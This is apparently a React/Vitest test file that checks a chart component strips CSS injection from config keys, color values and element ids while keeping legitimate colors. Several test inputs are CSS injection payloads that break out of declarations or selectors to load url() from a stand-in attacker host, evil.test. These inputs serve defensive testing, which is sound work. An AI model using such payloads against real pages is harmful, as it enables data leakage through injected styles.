import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { ChartContainer, ChartStyle } from "@/components/ui/chart";
import type { ChartConfig } from "@/components/ui/chart";

function styleText(container: HTMLElement): string {
  return container.querySelector("style")?.textContent ?? "";
}

describe("ChartStyle CSS injection", () => {
  it("drops config keys that are not plain CSS identifiers", () => {
    // The tag aggregation panel keys its config by eval tag name, which a user
    // (or a connected MCP server) supplies.
    const config = {
      "a; background-image: url(https://evil.test/?x=)": {
        label: "tag",
        color: "var(--chart-1)",
      },
    } as unknown as ChartConfig;

    const { container } = render(<ChartStyle id="chart-x" config={config} />);
    expect(styleText(container)).not.toContain("evil.test");
  });

  it("drops colors that could close the declaration", () => {
    const config = {
      passRate: { label: "Pass rate", color: "red; --leak: url(//evil.test)" },
    } as unknown as ChartConfig;

    const { container } = render(<ChartStyle id="chart-x" config={config} />);
    expect(styleText(container)).not.toContain("evil.test");
  });

  it("keeps legitimate colors", () => {
    const config = {
      passRate: { label: "Pass rate", color: "var(--chart-1)" },
      judgeScore: { label: "Judge", color: "hsl(var(--muted-foreground))" },
      raw: { label: "Raw", color: "#6b5e50" },
      p50Seconds: {
        label: "p50",
        color: "color-mix(in oklch, var(--chart-1) 55%, transparent)",
      },
    } satisfies ChartConfig;

    const { container } = render(<ChartStyle id="chart-x" config={config} />);
    const css = styleText(container);
    expect(css).toContain("--color-passRate: var(--chart-1);");
    expect(css).toContain("--color-judgeScore: hsl(var(--muted-foreground));");
    expect(css).toContain("--color-raw: #6b5e50;");
    expect(css).toContain(
      "--color-p50Seconds: color-mix(in oklch, var(--chart-1) 55%, transparent);",
    );
  });

  it("ignores an id that would break out of the attribute selector", () => {
    const { container } = render(
      <ChartContainer
        id="x] { background-image: url(https://evil.test) } [data-chart=y"
        config={{ passRate: { label: "Pass rate", color: "var(--chart-1)" } }}
      >
        <div />
      </ChartContainer>,
    );
    expect(styleText(container)).not.toContain("evil.test");
  });
});
